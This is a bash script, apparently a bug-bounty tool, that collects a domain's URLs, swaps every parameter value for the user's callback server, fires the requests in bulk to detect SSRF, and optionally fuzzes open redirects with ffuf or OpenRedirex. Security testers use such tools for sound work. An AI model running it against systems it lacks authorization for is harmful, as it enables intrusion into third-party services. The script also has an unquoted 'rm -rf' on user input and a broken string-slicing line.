usage(){
	echo "Usage: ./find.sh domain.com yourserver.com custom_urls.txt"
	echo "domain.com        --- The domain for which you want to test"
	echo "yourserver.com    --- Your server which detects SSRF. Eg. Burp colloborator"
	echo "custom_urls.txt   --- Optional argument. You give your own custom URLs instead of using gau"
}
if [ -f .profile ]; then
	source .profile
else
	source /home/hari/.profile 
	#Enter your .profile location if you haven't installed the tools through setup.sh
	#If installed through setup.sh, no changes are required
fi
red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
magenta=`tput setaf 5`
cyan=`tput setaf 6`
reset=`tput sgr0`
echo "${cyan} 

			  _____ _____ _____  ______ _____ _____  ______ 
			 / ____/ ____|  __ \|  ____|_   _|  __ \|  ____|
			| (___| (___ | |__) | |__    | | | |__) | |__   
			 \___ \\___ \|  _  /|  __|   | | |  _  /|  __|  
			 ____) |___) | | \ \| |     _| |_| | \ \| |____ 
			|_____/_____/|_|  \_\_|    |_____|_|  \_\______|
			                                                

	                                  			${green}- By michaelben${reset}
                                  "
if [[ $1 == "" ]]; then
	echo "${red}Please specify the domain name${reset}"
	usage
	exit 2
fi
if [[ $2 == "" ]]; then
	echo "${red}Please specify your server name. Eg. Burp colloborator${reset}"
	usage
	exit 2
fi

if [[ $3 != "" ]]; then
       if [ ! -f $3 ]; then
	       echo "${red}The given file does not exist!${reset}"
	       exit 2
       fi
fi       
domain=$1
if [[ ${domain:0:5} == "https" ]]; then
	domain=${domain:8:${#domain}-8}
elif [[ ${domain:0:4} == "http" ]]; then
	domain=${domain:7:${domain}-7}
fi
if [ -d output/$domain ]; then
	echo "${red}An output folder with the same domain name already exists.Please rename/delete the existing directory.${reset}"
	read -p "Would you like to delete that folder and start fresh[y/n]: " delete
	if [[ $delete == 'y' ]]; then
		rm -rf output/$domain
	else 
		exit 2
	fi
fi

echo -e "\n${yellow}Important note: This works only if you have ffuf, gau installed and have set their paths accordingly. If you want to check for open redirects using openredirex, you must have openredirex too.(Run setup.sh to and install all the tools to do that automatically)\n ${reset}"
mkdir output/$domain

if [[ $3 == "" ]]; then
	echo "${cyan}Fetching URLs using GAU (This may take some time depending on the domain. You can check the output generated till now at output/$domain/raw_urls.txt)"
	echo -e "\n${yellow}If you don't want to wait, and want to test for the output generated till now.\n1. Exit this process\n2. Copy the output/$domain/raw_urls.txt to some other location outside of $domain folder\n3. Supply the file location as the third argument.\nEg ./ssrfx.sh domain.com server.com path/to/raw_urls.txt"
	
	gau $1 > output/$domain/raw_urls.txt

	echo -e "${green}Done${reset}\n"
else 
	cat $3 > output/$domain/raw_urls.txt
fi

echo "${cyan}Sorting out the URLs with parameters and replacing the parameter's original value with your server${reset}"

./replaceParam.sh output/$domain/raw_urls.txt $2 | grep "?" | sort > output/$domain/parameterised_urls.txt
echo -e "${green}Done${reset}\n"
echo "${cyan}Removing duplicates${reset}"
uniq output/$domain/parameterised_urls.txt > output/$domain/final_urls.txt
total_urls=$(grep "" -c output/$domain/final_urls.txt)
echo -e "${green}The final URL list is at $domain/final_urls.txt${reset}\n"
echo "${yellow}Total URLs fetched with parameters: ${total_urls}${reset}"

echo -e "\n${cyan}Firing requests, check your server for any traffic!${reset}"

python3 async_req.py $domain

echo "${green}Done!${reset}"

read -p "${magenta}Do you want to check for open redirects?[y/any other character]${reset}" input
if [[ $input == 'y' ]]; then
	./replaceParam.sh output/$domain/final_urls.txt "FUZZ" > output/$domain/fuzz_urls.txt
	echo -e "\nChoose your tool: ${red}(Works only if you have the selected tool installed)${reset}"

	echo "1) FFUF${red}(Floods your terminal with large output)${reset}"
	echo "2) OpenRedirex"
	read -p "Enter your choice(1 or 2): " choice
	read -p "Enter the payload file location:[Press ENTER if you want to use the default]" payload
	if [[ $payload == "" ]]; then
		payload="payloads.txt"
	fi
	if [[ $choice == 1 ]]; then
		while IFS= read -r url
		do
			ffuf $url $payload 
		done < "output/$domain/fuzz_urls.txt"
		echo "${green}Done${reset}"
	elif [[ $choice == 2 ]]; then
		openredirex output/$domain/fuzz_urls.txt $payload
	fi
else
	exit 2
fi

